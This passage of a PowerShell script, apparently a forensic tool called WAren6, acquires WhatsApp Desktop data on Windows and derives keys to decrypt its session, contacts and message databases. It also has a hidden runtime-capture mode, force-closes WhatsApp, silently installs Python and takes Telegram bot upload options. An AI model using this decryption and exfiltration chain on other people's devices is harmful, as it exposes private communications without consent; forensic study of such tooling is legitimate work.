                    $kVal = [int][sbyte]$bytes[$dataStart]
                    $kLen = 1 
                }

                # Filter keys (0 to 10)
                if ($null -ne $kVal -and ($kVal -ge 0 -and $kVal -le 10)) {
                    $blobHex = ""
                    $status = ""

                    # Case A: Value is BLOB - SQLite serial type: blobSize = (vType - 12) / 2
                    # WhatsApp changed from 32-byte keys (0x4C) to 48-byte keys (0x6C)
                    # Accept any BLOB between 16 and 64 bytes as a valid key candidate
                    if ($vType -ge 12 -and $vType % 2 -eq 0) {
                        $blobSize = ($vType - 12) / 2
                        if ($blobSize -ge 16 -and $blobSize -le 64) {
                            if (($dataStart + $kLen + $blobSize) -le $pEnd) {
                                $blob = New-Object byte[] $blobSize
                                [Buffer]::BlockCopy($bytes, ($dataStart + $kLen), $blob, 0, $blobSize)
                                $blobHex = [BitConverter]::ToString($blob).Replace("-", "")
                                $status = "$blobSize bytes"
                            }
                        }
                    }
                    # Case B: value is NULL (type 0).
                    elseif ($vType -eq 0) {
                        $blobHex = "[NULL]"
                        $status = "Null"
                    }

                    if ($status -ne "") {
                        $results.Add([PSCustomObject]@{
                                Frame   = "F" + [Math]::Floor(($offset - 32) / ($pageSize + 24))
                                Key     = $kVal
                                Status  = $status
                                HexBlob = $blobHex
                                DBPage  = [System.Net.IPAddress]::NetworkToHostOrder([BitConverter]::ToInt32($bytes, $offset))
                            })
                    }
                }
            }
        }
        $offset += 24 + $pageSize
    }

    return $results
}

function Protect-WebView2Secret {
    param (
        [Parameter(Mandatory = $true)]
        [string]$HexInput,
        
        [Parameter(Mandatory = $false)]
        [string]$Descriptor = "LOCAL=user"
    )

    # Define and add the C# type only when it is missing.
    if (-not ([System.Management.Automation.PSTypeName]'DpapiNgInteropV2').Type) {
        $code = @"
        using System;
        using System.Runtime.InteropServices;

        public static class DpapiNgInteropV2 {
            [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
            public static extern int NCryptCreateProtectionDescriptor(string descriptorString, uint flags, out IntPtr phDescriptor);

            [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
            public static extern int NCryptCloseProtectionDescriptor(IntPtr hDescriptor);

            [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
            public static extern int NCryptProtectSecret(IntPtr hDescriptor, uint dwFlags, byte[] pbData, int cbData, IntPtr pMemPara, IntPtr hWnd, out IntPtr ppbProtectedBlob, out int pcbProtectedBlob);

            [DllImport("kernel32.dll")]
            public static extern IntPtr LocalFree(IntPtr hMem);
        }
"@
        Add-Type -TypeDefinition $code
    }

    # 2. Convert Hex String to Byte Array
    $cleanHex = $HexInput.Trim() -replace '[^0-9A-Fa-f]', ''
    if ($cleanHex.Length % 2 -ne 0) { throw "Invalid hexadecimal string." }
    
    $inputBytes = New-Object byte[] ($cleanHex.Length / 2)
    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
        $inputBytes[$i / 2] = [Convert]::ToByte($cleanHex.Substring($i, 2), 16)
    }

    # 3. Protection DPAPI-NG
    $hDescriptor = [IntPtr]::Zero
    $res = [DpapiNgInteropV2]::NCryptCreateProtectionDescriptor($Descriptor, 0, [ref]$hDescriptor)
    
    if ($res -ne 0) {
        Write-Error "Error creating descriptor: $res"
        return $null
    }

    try {
        $ptrOut = [IntPtr]::Zero
        $sizeOut = 0
        $resProtect = [DpapiNgInteropV2]::NCryptProtectSecret($hDescriptor, 0, $inputBytes, $inputBytes.Length, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$ptrOut, [ref]$sizeOut)

        if ($resProtect -eq 0) {
            $protected = New-Object byte[] $sizeOut
            [Runtime.InteropServices.Marshal]::Copy($ptrOut, $protected, 0, $sizeOut)
            
            # Extract first 32 bytes
            $sessionDBSecret = $protected[0..31]
            
            # Return data
            return [PSCustomObject]@{
                FullBlob    = $protected
                Secret32    = $sessionDBSecret
                HexSecret32 = [BitConverter]::ToString($sessionDBSecret).Replace('-', '')
            }
        }
        else {
            Write-Error "Error protecting bytes: code $resProtect"
            return $null
        }
    }
    finally {
        # Memory cleaning
        if ($ptrOut -ne [IntPtr]::Zero) { [DpapiNgInteropV2]::LocalFree($ptrOut) | Out-Null }
        if ($hDescriptor -ne [IntPtr]::Zero) { [DpapiNgInteropV2]::NCryptCloseProtectionDescriptor($hDescriptor) | Out-Null }
    }
}

#########################################################################################################
# Main 

function Start-WAren6 {
    param(
        [Parameter(Mandatory = $false)]
        [string]$WhatsAppPath,
        [Parameter(Mandatory = $false)]
        [switch]$UseSuppliedODUID,
        [Parameter(Mandatory = $false)]
        [string]$ID,
        [Parameter(Mandatory = $false)]
        [string]$OutputPath,
        [Parameter(Mandatory = $false)]
        [switch]$OnlineBootstrap,
        [Parameter(Mandatory = $false)]
        [switch]$OfflineMode,
        [Parameter(Mandatory = $false)]
        [switch]$DeleteCaseDirectoryAfterArchive,
        [Parameter(Mandatory = $false)]
        [string]$TelegramBotToken,
        [Parameter(Mandatory = $false)]
        [string]$TelegramChatId,
        [Parameter(Mandatory = $false)]
        [switch]$TelegramAutoDelete,
        [Parameter(Mandatory = $false)]
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Justification = 'Field CLI intentionally accepts -enc "PASS"; command summaries and manifests redact this value.')]
        [string]$TelegramEncryptPassword,
        [Parameter(Mandatory = $false)]
        [string]$TelegramApiBase = "https://api.telegram.org",
        [Parameter(Mandatory = $false)]
        [string]$ReportTimezone = "local",
        [Parameter(Mandatory = $false)]
        [switch]$Store8CryptoResearch,
        [Parameter(Mandatory = $false)]
        [string]$OpaqueSaltFile,
        [Parameter(Mandatory = $false)]
        [string]$RuntimeStore8Jsonl,
        [Parameter(Mandatory = $false)]
        [switch]$WithMedia,
        [Parameter(Mandatory = $false)]
        [switch]$Hybrid,
        [Parameter(Mandatory = $false)]
        [switch]$AcquireOnly,
        [Parameter(Mandatory = $false)]
        [switch]$GenerateReports,
        [Parameter(Mandatory = $false)]
        [switch]$Silent,
        [Parameter(Mandatory = $false)]
        [switch]$ForegroundRuntime
    )
    try {
        if (-not $Silent -and -not [Console]::IsOutputRedirected) {
            Clear-Host
        }
    }
    catch { }

    Set-Variable -Name reverseDate -Value $(Get-Date -Format "yyyyMMddHHmmss") -Scope Global
    Set-Variable -Name targetOutput -Value "$OutputPath\WAren6_$reverseDate" -Scope Global
    New-Item -ItemType Directory -Force -Path $OutputPath | Out-Null
    Start-WAren6Log -LogPath (Join-Path $OutputPath "WAren6_$reverseDate.logs.txt") -CommandLine (Protect-WAren6CommandLine -CommandLine ([Environment]::CommandLine))

    Write-WAren6Output "
__        ___    ____
\ \      / / \  |  _ \ ___ _ __   / /_
 \ \ /\ / / _ \ | |_) / _ \ '_ \ | '_ \
  \ V  V / ___ \|  _ <  __/ | | || (_) |
   \_/\_/_/   \_\_| \_\___|_| |_| \___/
                                       WAren6
# Version: $WAren6Version
# Source Path: $($WhatsAppPath)
# Output Path: $($targetOutput)"

    $modeLabel = Get-WAren6ModeLabel -AcquireOnly:$AcquireOnly -OfflineMode:$OfflineMode -Hybrid:$Hybrid
    $networkLabel = Get-WAren6NetworkLabel -OnlineBootstrap:$OnlineBootstrap -OfflineMode:$OfflineMode -Hybrid:$Hybrid
    Write-WAren6CommandSummary `
        -Mode $modeLabel `
        -WithMedia ([bool]$WithMedia) `
        -Network $networkLabel `
        -Source $WhatsAppPath `
        -Output $targetOutput

    # Verify Administrator rights 
    # (UAC Elevation Disabled)

    Add-Type -AssemblyName System.Security
    Add-Type -AssemblyName System.Windows.Forms
    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class ClipcWrapper {
    [DllImport("clipc.dll")]
    public static extern int GetOfflineDeviceUniqueID(uint cbSalt, byte[] pbSalt, out uint oMethod, ref uint pcbSystemId, byte[] rgbSystemId, uint unk1, uint unk2);
}
"@ 
    }
    catch {
        Write-Warning "Unable to add the ClipcWrapper to use GetOfflineDeviceUniqueID - Unless ODUID can be extracted by other means, decryption may not be successful."
    }
    try {
        Add-Type -Path "$PSScriptRoot\BouncyCastle.Cryptography.dll"
        Write-Verbose "BouncyCastle Assembly loaded."
    }
    catch {
        Write-Error "Error: BouncyCastle assembly not loaded. Make sure the BouncyCastle.Cryptography.dll is located in $PSScriptRoot."
        exit
    }
    if (-not $PSBoundParameters.ContainsKey('WhatsAppPath')) {
        $WhatsAppPath = Get-AppLocalStatePath -AppName "WhatsApp"
        if ($null -eq $WhatsAppPath) {
            Write-WAren6Output "  [!] WhatsApp installation path not found on this PC."
            Write-WAren6Output "      Use the -WhatsApp argument to specify a standalone directory."
            exit
        }
    }
    
    Write-WAren6Output ""
    Write-WAren6Output "+------------------------------------------------------------+"
    Write-WAren6Output "|                WAren6 Forensic Pipeline                 |"
    Write-WAren6Output "+------------------------------------------------------------+"
    Write-WAren6Output ""
    
    $globalWatch = [System.Diagnostics.Stopwatch]::StartNew()
    $sectionWatch = [System.Diagnostics.Stopwatch]::StartNew()
    
    Write-WAren6Output "+-- [1/4] Acquisition & File Verification -------------------+"
    $modeInfo = [PSCustomObject]@{
        offline = [bool]$OfflineMode
        useSuppliedOduid = [bool]$UseSuppliedODUID
        withMedia = [bool]$WithMedia
        hybrid = [bool]$Hybrid
        acquireOnly = [bool]$AcquireOnly
        silent = [bool]$Silent
        runtimeHidden = [bool](-not $ForegroundRuntime)
        onlineBootstrap = [bool]$OnlineBootstrap
        legacyFlags = $script:WAren6LegacyCliFlags
        runtimeSupplement = $null
        pythonUnified = $false
        networkSideEffects = @()
    }
    $verboseSourcePath = Protect-WAren6PathText -Text $WhatsAppPath -CaseRoot $targetOutput
    $verboseOutputPath = Protect-WAren6PathText -Text $targetOutput -CaseRoot $targetOutput
    Write-Verbose $verboseSourcePath
    Write-Verbose "Copying $verboseSourcePath to $verboseOutputPath"

    $acquisitionStepWatch = [System.Diagnostics.Stopwatch]::StartNew()
    $runtimeCaptureRoot = $null
    $runtimeCapturedJsonl = $null
    if ($Hybrid -and -not $RuntimeStore8Jsonl) {
        $runtimeHidden = -not $ForegroundRuntime
        $runtimeCaptureRoot = Join-Path $OutputPath ("WAren6_runtime_capture_" + $reverseDate)
        New-Item -ItemType Directory -Force -Path $runtimeCaptureRoot | Out-Null
        $runtimeModeLabel = if ($runtimeHidden) { "hidden background" } else { "visible foreground" }
        Write-WAren6Output "  [>] Hybrid mode: capturing live Store 8 runtime supplement ($runtimeModeLabel)..."
        try {
            $runtimeCapturedJsonl = Invoke-WAren6RuntimeStore8Capture -OutputDirectory $runtimeCaptureRoot -Silent:$runtimeHidden -BlockClose:$ForegroundRuntime
            $modeInfo.runtimeSupplement = [PSCustomObject]@{
                path = $null
                stagedPath = $runtimeCapturedJsonl
                sha256 = if (Test-WAren6RuntimeJsonl -Path $runtimeCapturedJsonl) { Get-WAren6FileSha256Hex -Path $runtimeCapturedJsonl } else { $null }
                status = if (Test-WAren6RuntimeJsonl -Path $runtimeCapturedJsonl) { "staged" } else { "captured_unusable" }
                usableRecords = $null
                recordsWithText = $null
                warnings = @()
            }
            $modeInfo.networkSideEffects += $(if ($runtimeHidden) { "whatsapp_runtime_opened_hidden" } else { "whatsapp_runtime_opened_visible" })
            if (Test-WAren6RuntimeJsonl -Path $runtimeCapturedJsonl) {
                Write-WAren6Output "  [>] Runtime Store 8 supplement staged for preservation."
            }
            else {
                Write-Warning "Hybrid runtime capture returned no usable JSONL file. Continuing with offline extraction."
            }
        }
        catch {
            $modeInfo.runtimeSupplement = [PSCustomObject]@{
                path = $null
                stagedPath = $runtimeCapturedJsonl
                sha256 = $null
                status = "failed"
                error = $_.Exception.Message
                usableRecords = $null
                recordsWithText = $null
                warnings = @($_.Exception.Message)
            }
            Write-Warning "Hybrid runtime capture failed: $($_.Exception.Message). Continuing with offline extraction."
        }
        Write-WAren6StepTiming -Label "Runtime capture" -Stopwatch $acquisitionStepWatch
    }
    
    # Close WhatsApp to release file locks on databases
    $whatsAppProcesses = Get-Process -Name "*WhatsApp*" -ErrorAction SilentlyContinue
    $wasWhatsAppRunning = $false
    if ($whatsAppProcesses) {
        $wasWhatsAppRunning = $true
        Write-WAren6Output "  [!] WhatsApp Desktop is running."
        Write-WAren6Output "      Closing to release database file locks..."
        foreach ($proc in $whatsAppProcesses) {
            try { $proc.CloseMainWindow() | Out-Null } catch { }
        }
        $timeout = 10; $elapsed = 0
        while ($elapsed -lt $timeout) {
            Start-Sleep -Seconds 1; $elapsed++
            $remaining = Get-Process -Name "*WhatsApp*" -ErrorAction SilentlyContinue
            if (-not $remaining) { Write-WAren6Output "  [OK] WhatsApp closed gracefully."; break }
        }
        $remaining = Get-Process -Name "*WhatsApp*" -ErrorAction SilentlyContinue
        if ($remaining) {
            Write-Warning "Force-terminating WhatsApp..."
            $remaining | Stop-Process -Force -ErrorAction SilentlyContinue
        }
        Wait-WAren6DatabaseLockRelease -RootPath $WhatsAppPath | Out-Null
        Write-WAren6Output "  [OK] File locks released. Proceeding with copy..."
    }
    Write-WAren6StepTiming -Label "WhatsApp shutdown" -Stopwatch $acquisitionStepWatch
    
    $localStateExcludes = @()
    if (-not $WithMedia) {
        $localStateExcludes += "transfers"
    }
    Copy-Directory -Source $WhatsAppPath -Destination $targetOutput -ExcludeDirectories $localStateExcludes
    Write-WAren6StepTiming -Label "LocalState copy" -Stopwatch $acquisitionStepWatch
    if ($runtimeCapturedJsonl) {
        $preservedRuntimeJsonl = Copy-WAren6RuntimeSupplement `
            -SourceJsonl $runtimeCapturedJsonl `
            -DestinationCaseRoot $targetOutput
        if ($preservedRuntimeJsonl) {
            $RuntimeStore8Jsonl = $preservedRuntimeJsonl
            if ($modeInfo.runtimeSupplement) {
                $modeInfo.runtimeSupplement.path = $RuntimeStore8Jsonl
                $modeInfo.runtimeSupplement.sha256 = Get-WAren6FileSha256Hex -Path $RuntimeStore8Jsonl
                $modeInfo.runtimeSupplement.status = "preserved"
            }
            Write-WAren6Output "  [>] Runtime Store 8 supplement preserved in case folder."
            if ($runtimeCaptureRoot -and (Test-Path -LiteralPath $runtimeCaptureRoot)) {
                Remove-Item -LiteralPath $runtimeCaptureRoot -Force -Recurse -ErrorAction SilentlyContinue
            }
        }
        else {
            if ($modeInfo.runtimeSupplement) {
                $modeInfo.runtimeSupplement.status = "captured_unusable"
            }
            Write-Warning "Runtime Store 8 supplement was not preserved because the staged JSONL was missing or empty."
        }
        Write-WAren6StepTiming -Label "Runtime supplement preservation" -Stopwatch $acquisitionStepWatch
    }
    "WAren6 DATE: $reverseDate" | Out-File -FilePath "$targetOutput\$metaDataFileName" -Append

    # Acquire the WebView2 IndexedDB (primary message store with sender info,
    # contact LID-to-phone mappings, reactions, and group metadata)
    $idbSource = Join-Path (Split-Path $WhatsAppPath -Parent) "LocalCache\EBWebView\Default\IndexedDB"
    if (Test-Path $idbSource) {
        $idbDest = "$targetOutput\EBWebView_Default"
        $idbDestIndexedDB = "$idbDest\IndexedDB"
        Write-WAren6Output "  [>] Acquiring WebView2 IndexedDB"
        Copy-Directory -Source $idbSource -Destination $idbDestIndexedDB
        Write-WAren6Output "  [OK] IndexedDB acquired successfully"
        Write-WAren6StepTiming -Label "IndexedDB copy" -Stopwatch $acquisitionStepWatch
    }
    else {
        Write-Warning "WebView2 IndexedDB not found at '$idbSource' - unified DB will not be built."
        $idbDest = $null
    }

    # Local Storage contains WebWA crypto metadata such as WebEncKeySalt.
    # It is preserved for completeness and future opaque Store 8 body recovery.
    $localStorageSource = Join-Path (Split-Path $WhatsAppPath -Parent) "LocalCache\EBWebView\Default\Local Storage"
    if (Test-Path $localStorageSource) {
        if (-not $idbDest) {
            $idbDest = "$targetOutput\EBWebView_Default"
        }
        $localStorageDest = Join-Path $idbDest "Local Storage"
        Write-WAren6Output "  [>] Acquiring WebView2 Local Storage"
        Copy-Directory -Source $localStorageSource -Destination $localStorageDest
        Write-WAren6Output "  [OK] Local Storage acquired successfully"
        Write-WAren6StepTiming -Label "Local Storage copy" -Stopwatch $acquisitionStepWatch
    }
    else {
        Write-Warning "WebView2 Local Storage not found at '$localStorageSource' - encrypted opaque message rows may remain unresolved."
    }

    if ($Store8CryptoResearch) {
        $webViewDefault = Join-Path (Split-Path $WhatsAppPath -Parent) "LocalCache\EBWebView\Default"
        $extraWebViewDirs = @(
            "Cache",
            "Code Cache",
            "Network",
            "Service Worker",
            "Session Storage",
            "File System",
            "blob_storage",
            "DawnCache",
            "GPUCache",
            "databases"
        )
        foreach ($extraDir in $extraWebViewDirs) {
            $extraSource = Join-Path $webViewDefault $extraDir
            if (Test-Path $extraSource) {
                $hasExtraFiles = Get-ChildItem -LiteralPath $extraSource -Force -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 1
                if (-not $hasExtraFiles) {
                    Write-WAren6Output "  [>] Skipping empty WebView2 $extraDir"
                    continue
                }
                if (-not $idbDest) {
                    $idbDest = "$targetOutput\EBWebView_Default"
                }
                $extraDest = Join-Path $idbDest $extraDir
                Write-WAren6Output "  [>] Acquiring WebView2 $extraDir for Store 8 research"
                Copy-Directory -Source $extraSource -Destination $extraDest
            }
        }
    }

    if (-not $UseSuppliedODUID) {
        $ODUID = Get-OfflineDeviceUniqueID -Salt $global:getODUID_salt
        "ODUID Extraction Method: $($ODUID.Method)" | Out-File -FilePath "$targetOutput\$metaDataFileName" -Append
        Write-WAren6Output "Method: $($ODUID.Method)"
        $WhatsAppAppUID = $ODUID.ID
        $hexWhatsAppAppUID = ConvertTo-HexString $WhatsAppAppUID
        $oduidFingerprint = Format-WAren6SecretFingerprint -Bytes $WhatsAppAppUID
        "ODUID_SHA256: $(Get-WAren6BytesSha256Hex -Bytes $WhatsAppAppUID)" | Out-File -FilePath "$targetOutput\$metaDataFileName" -Append
        Write-WAren6Output "ODUID: [redacted; sha256:$oduidFingerprint]"
        Write-WAren6StepTiming -Label "ODUID" -Stopwatch $acquisitionStepWatch
    }
    else {
        $WhatsAppAppUID = Convert-HexStringToByteArray $ID
        $hexWhatsAppAppUID = $ID
        $ODUID = [PSCustomObject]@{
            Method = "SUPPLIED"
            ID = $WhatsAppAppUID
        }
        "ODUID_SHA256: $(Get-WAren6BytesSha256Hex -Bytes $WhatsAppAppUID)" | Out-File -FilePath "$targetOutput\$metaDataFileName" -Append
        Write-WAren6Output "  [>] Supplied ODUID processing: [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $WhatsAppAppUID)]"
        Write-WAren6StepTiming -Label "ODUID" -Stopwatch $acquisitionStepWatch
    }
    
    $sectionWatch.Stop()
    Write-WAren6Output "+-- (Completed in $($sectionWatch.Elapsed.TotalSeconds.ToString('F1'))s) ----------------------------------+"
    Write-WAren6Output ""
    $sectionWatch.Restart()
    Write-WAren6Output "+-- [2/4] Decryption Engine ---------------------------------+"
     
    # Detect WhatsApp Desktop architecture
    $sessionDBFileExists = Test-Path -Path "$WhatsAppPath\session.db" -PathType Leaf
    $sessionsDirExists = Test-Path -Path "$WhatsAppPath\sessions" -PathType Container

    if ($sessionDBFileExists -and $sessionsDirExists) {
        $staticKeyBytes = Convert-HexStringToByteArray $global:webview2_staticBytes
        Write-WAren6Output "  [>] Preparing WebView2 session key material..."
       
        
        $sessionDBSecretData = Protect-WebView2Secret $global:webview2_staticBytes
        $sessionDBSecret = $sessionDBSecretData.Secret32 
        Write-WAren6Output "  [OK] Session secret derived."
        
        # Verify critical files were copied
        if (-not (Test-Path "$targetOutput\session.db-wal")) {
            Write-Error "CRITICAL: session.db-wal not copied. Files may be locked. Run as Administrator."
            return
        }
        
        Write-WAren6Output "Decrypting session.db-wal"
        try { Unprotect-DatabaseWalFile $sessionDBSecret "$targetOutput\session.db-wal" "$targetOutput\session.dec.db-wal" }
        catch { Write-Error "Failed to decrypt session.db-wal: $($_.Exception.Message)"; return }
        Write-WAren6Output "Decrypting session.db"
        try { Unprotect-DatabaseFile $sessionDBSecret "$targetOutput\session.db" "$targetOutput\session.dec.db" }
        catch { Write-Error "Failed to decrypt session.db: $($_.Exception.Message)"; return }
        
        Write-WAren6Output "  [>] Reading decrypted session WAL settings..."
        $clientKeyList = Get-WalSettingsData $targetOutput"\session.dec.db-wal"
        
        # Validate clientKeyList
        if (-not $clientKeyList -or $clientKeyList.Count -eq 0) {
            Write-Error "CRITICAL: No client keys found in session.dec.db-wal."
            Write-Error "The WAL file may be empty or in an unexpected format."
            return
        }
        
        $lastEntry = $clientKeyList[-1]
        if (-not $lastEntry -or [string]::IsNullOrWhiteSpace($lastEntry.HexBlob) -or $lastEntry.HexBlob -eq '[NULL]') {
            Write-Error "CRITICAL: Last client key entry has no valid blob data."
            return
        }
        
        $clientKey = Convert-HexStringToByteArray $lastEntry.HexBlob
        Write-WAren6Output "  [OK] Client key recovered from session WAL."
        
        #Session dir
        $sha1 = [System.Security.Cryptography.SHA1]::Create()
        $hashBytes = $sha1.ComputeHash($clientKey)
        $targetSession = [BitConverter]::ToString($hashBytes).Replace('-', '') 
        Write-WAren6Output "  [>] Session directory: $targetSession"
        
        #DB files
        $publisherKey = $ODUID.ID 
        Write-WAren6Output "  [>] Deriving database encryption key..."
        
        # Generate encryption key (auxKey2) through PBKDF2
        $digest = [Org.BouncyCastle.Crypto.Digests.Sha256Digest]::new()
        $generator = [Org.BouncyCastle.Crypto.Generators.Pkcs5S2ParametersGenerator]::new($digest) 
        $generator.Init($clientKey, $publisherKey, $global:pbkdf_iterations) 
        $keyParameter = $generator.GenerateDerivedMacParameters(256) 
        $auxKey = $keyParameter.GetKey()
        # Generate IV through PBKDF2
        $generator.Init($auxKey, $publisherKey, $global:pbkdf_iterations) 
        $keyParameter = $generator.GenerateDerivedMacParameters(128) 
        $IV = $keyParameter.GetKey()
        
        # Create the AES object 
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $auxKey
        $aes.IV = $IV
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7 #None
        # Create a encryptor
        $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
        # Encrypt the key
        $dbKey = $encryptor.TransformFinalBlock($staticKeyBytes, 0, $staticKeyBytes.Length) 
        $aes.Dispose()
        
        #Crop first (32 bytes)
        $dbKey = $dbKey[0..63] 

        Write-WAren6Output "  [OK] Database key derived."
        $workingDir = "$targetOutput\sessions\$targetSession"

        # Verify session directory exists - if not, discover the actual session dir
        if (-not (Test-Path $workingDir)) {
            Write-Warning "Computed session dir '$targetSession' not found. Scanning for active session..."
            $sessionsRoot = "$targetOutput\sessions"
            $actualSession = Get-ChildItem -Path $sessionsRoot -Directory -Force `
                | Where-Object { $_.Name -ne '00000' } `
                | Select-Object -First 1
            if ($actualSession) {
                Write-Warning "Using discovered session: '$($actualSession.Name)'"
                $workingDir = $actualSession.FullName
            } else {
                Write-Error "CRITICAL: No valid session directory found under '$sessionsRoot'"
                return
            }
        }
        
        if (Test-Path "$workingDir\nativeSettings.db-wal") {
            Write-WAren6Output "Decrypting nativeSettings.db-wal"
            Unprotect-DatabaseWalFile $dbKey ("$workingDir\nativeSettings.db-wal") ("$workingDir\nativeSettings.dec.db-wal")
        }
        else { Write-Warning "nativeSettings.db-wal not found - skipping." }
        
        if (Test-Path "$workingDir\nativeSettings.db") {
            Write-WAren6Output "Decrypting nativeSettings.db"
            Unprotect-DatabaseFile $dbKey ("$workingDir\nativeSettings.db") ("$workingDir\nativeSettings.dec.db")
        }
        else { Write-Warning "nativeSettings.db not found - skipping." }

        
        $databaseKeyList = Get-WalSettingsData "$workingDir\nativeSettings.dec.db-wal"
        

        if ($databaseKeyList) {
            # Group key records for key types 1, 2, and 3.
            $keyGroup = $databaseKeyList | Where-Object { $_.Key -in 1, 2, 3 } | Group-Object Key

            foreach ($keyType in $keyGroup) {
                # Get the latest key from this key type.
                $lastFromThisType = $keyType.Group | Select-Object -Last 1
                
                $currentKey = $lastFromThisType.Key
                $dbKey = Convert-HexStringToByteArray $lastFromThisType.HexBlob
                switch ($currentKey) {
                    1 {
                        $dbNames = @("genericStorage")
                        foreach ($dbName in $dbNames) {
                            if (Test-Path "$workingDir\$dbName.db-wal") {
                                Write-WAren6Output "Decrypting $dbName.db-wal"
                                try { Unprotect-DatabaseWalFile $dbKey ("$workingDir\$dbName.db-wal") ("$workingDir\$dbName.dec.db-wal") }
                                catch { Write-Warning "Error decrypting $($dbName).db-wal: $($_.Exception.Message)" }
                            }
                            else { Write-Warning "$dbName.db-wal not found - skipping." }
                            if (Test-Path "$workingDir\$dbName.db") {
                                Write-WAren6Output "Decrypting $dbName.db"
                                try { Unprotect-DatabaseFile $dbKey ("$workingDir\$dbName.db") ("$workingDir\$dbName.dec.db") }
                                catch { Write-Warning "Error decrypting $($dbName).db: $($_.Exception.Message)" }
                            }
                            else { Write-Warning "$dbName.db not found - skipping." }
                        }
                    }
                    2 {
                        $dbNames = @("abprops", "contacts", "contactsState", "mediaDownloads")
                        foreach ($dbName in $dbNames) {
                            if (Test-Path "$workingDir\$dbName.db-wal") {
                                Write-WAren6Output "Decrypting $dbName.db-wal"
                                try { Unprotect-DatabaseWalFile $dbKey ("$workingDir\$dbName.db-wal") ("$workingDir\$dbName.dec.db-wal") }
                                catch { Write-Warning "Error decrypting $($dbName).db-wal: $($_.Exception.Message)" }
                            }
                            else { Write-Warning "$dbName.db-wal not found - skipping." }
                            if (Test-Path "$workingDir\$dbName.db") {
                                Write-WAren6Output "Decrypting $dbName.db"
                                try { Unprotect-DatabaseFile $dbKey ("$workingDir\$dbName.db") ("$workingDir\$dbName.dec.db") }
                                catch { Write-Warning "Error decrypting $($dbName).db: $($_.Exception.Message)" }
                            }
                            else { Write-Warning "$dbName.db not found - skipping." }
                        }
                    }
                    3 {}
                    Default {}
                }
            }
        }
        else {
            Write-Warning "Error processing nativeSettings WAL file."
        }
        
    }
    else {
        $userKey = Get-Key -FilePath "$WhatsAppPath\nondb_settings16.dat" -HasPadding $true
        $hexUserKey = ConvertTo-HexString $userKey 
        Write-WAren6Output "UserKey: [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $userKey)]"
        
        $ns18Output = Get-Key -FilePath "$WhatsAppPath\nondb_settings18.dat" -HasPadding $true
        $tmp_dec_nondb_settings18 = Join-Path -Path $OutputDirectory -ChildPath 'dec_nondb_settings18.dat'
        [System.IO.File]::WriteAllBytes($tmp_dec_nondb_settings18, $ns18Output)
        Write-Verbose "NS18: [redacted; sha256:$(Format-WAren6SecretFingerprint -Bytes $ns18Output)]"
        
        $dbKey = Get-Key -FilePath $tmp_dec_nondb_settings18 -UserKey $userKey -HasPadding $false
        $hexDBKey = ConvertTo-HexString $dbKey 
        Write-WAren6Output "  [OK] Legacy database key derived."
        "DBKEY_SHA256: $(Get-WAren6BytesSha256Hex -Bytes $dbKey)" | Out-File -FilePath "$targetOutput\$metaDataFileName" -Append
        Remove-Item $tmp_dec_nondb_settings18

        # Decrypt all-files
        Write-WAren6Output "Decrypting databases..."
        Unprotect-AllDatabaseFiles $dbKey $targetOutput
    }

    # -- Build the unified database from IndexedDB + decrypted SQLite ---------
    $waExtractScript = Join-Path $PSScriptRoot "waren6.py"
    $unifiedDb = "$targetOutput\unified_whatsapp.db"

    if ($AcquireOnly) {
        Write-WAren6Output "  [>] AcquireOnly set; skipping unified DB build."
    }
    elseif ((Test-Path $waExtractScript) -and $idbDest -and (Test-Path $idbDest)) {

        # -- Helper: Resolve a working Python executable -----------------------
        # Returns the path to a working python.exe, or $null if none found.
        function Resolve-PythonExe {
            # Strategy 1: python already on PATH
            $candidates = @("python", "python3", "py")
            foreach ($cmd in $candidates) {
                try {
                    $ver = & $cmd --version 2>&1
                    if ($LASTEXITCODE -eq 0 -and $ver -match 'Python\s+3\.') {
                        Write-Host "  Found system Python: $ver"
                        return $cmd
                    }
                }
                catch { }
            }

            # Strategy 2: Common installation paths (user + system)
            $knownPaths = @(
                "$env:LOCALAPPDATA\Programs\Python\Python3*\python.exe",
                "$env:LOCALAPPDATA\Programs\Python\Python*\python.exe",
                "C:\Python3*\python.exe",
                "C:\Python*\python.exe",
                "$env:ProgramFiles\Python3*\python.exe",
                "$env:ProgramFiles\Python*\python.exe"
            )
            foreach ($glob in $knownPaths) {
                $found = Get-ChildItem -Path $glob -ErrorAction SilentlyContinue | Sort-Object Name -Descending | Select-Object -First 1
                if ($found) {
                    try {
                        $ver = & $found.FullName --version 2>&1
                        if ($LASTEXITCODE -eq 0 -and $ver -match 'Python\s+3\.') {
                            Write-Host "  Found Python at: $($found.FullName)"
                            return $found.FullName
                        }
                    }
                    catch { }
                }
            }

            return $null
        }

        # -- Helper: Silent Python install (no GUI, no popups) -----------------
        function Install-PythonSilently {
            $pyVersion = "3.12.4"
            $installerUrl = "https://www.python.org/ftp/python/$pyVersion/python-$pyVersion-amd64.exe"
            $installerPath = Join-Path $env:TEMP "python-$pyVersion-installer.exe"

            Write-Host "  Downloading Python $pyVersion installer..."
            try {
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                $wc = New-Object System.Net.WebClient
                $wc.DownloadFile($installerUrl, $installerPath)
            }
            catch {
                Write-Warning "  Failed to download Python installer: $($_.Exception.Message)"
                return $false
            }

            if (-not (Test-Path $installerPath)) {
                Write-Warning "  Python installer was not downloaded."
                return $false
            }

            Write-Host "  Installing Python silently (this may take a moment)..."
            try {
                # /quiet = no GUI, InstallAllUsers=1 = system-wide, PrependPath=1 = add to PATH
                $proc = Start-Process -FilePath $installerPath `
                    -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1", "Include_pip=1", "Include_test=0" `
                    -Wait -PassThru -NoNewWindow -ErrorAction Stop
                if ($proc.ExitCode -ne 0) {
